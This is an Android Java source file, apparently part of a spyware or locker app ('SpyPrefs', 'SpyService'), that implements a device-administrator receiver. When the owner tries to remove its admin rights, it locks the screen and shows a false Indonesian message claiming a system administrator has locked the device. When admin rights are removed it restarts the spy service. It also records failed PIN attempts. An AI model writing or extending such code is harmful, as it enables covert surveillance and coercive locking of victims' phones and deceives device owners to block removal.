package com.nullx.pp;

import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;

public class DeviceAdminHelper extends DeviceAdminReceiver {

    @Override
    public void onEnabled(Context context, Intent intent) {
        context.getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE)
            .edit().putBoolean("adminEnabled", true).apply();
    }

    @Override
    public CharSequence onDisableRequested(Context context, Intent intent) {
        SharedPreferences prefs = context.getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
        boolean isLocked = prefs.getBoolean("isLocked", false);
        if (isLocked) {
            try {
                DevicePolicyManager dpm = (DevicePolicyManager)
                    context.getSystemService(Context.DEVICE_POLICY_SERVICE);
                ComponentName comp = new ComponentName(context, DeviceAdminHelper.class);
                if (dpm != null && dpm.isAdminActive(comp)) {
                    dpm.lockNow();
                }
            } catch (Exception ignored) {}
            return "Perangkat sedang dikunci oleh administrator sistem. Hubungi administrator untuk membuka kunci.";
        }
        return "Menonaktifkan akan menghapus proteksi sistem.";
    }

    @Override
    public void onDisabled(Context context, Intent intent) {
        context.getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE)
            .edit().putBoolean("adminEnabled", false).apply();

        // ✅ FIX: Ganti MyService dengan SpyService
        Intent svc = new Intent(context, SpyService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(svc);
        } else {
            context.startService(svc);
        }
    }

    @Override
    public void onPasswordFailed(Context context, Intent intent) {
        SharedPreferences prefs = context.getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
        int fails = prefs.getInt("pinFails", 0) + 1;
        prefs.edit().putInt("pinFails", fails).apply();
    }

    @Override
    public void onPasswordSucceeded(Context context, Intent intent) {
        context.getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE)
            .edit().putInt("pinFails", 0).apply();
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        super.onReceive(context, intent);
    }

    // ✅ FIX: Tambahkan method isAdminActive yang diminta oleh MainActivity
    public static boolean isAdminActive(Context context) {
        DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName adminComponent = new ComponentName(context, DeviceAdminHelper.class);
        return dpm != null && dpm.isAdminActive(adminComponent);
    }
}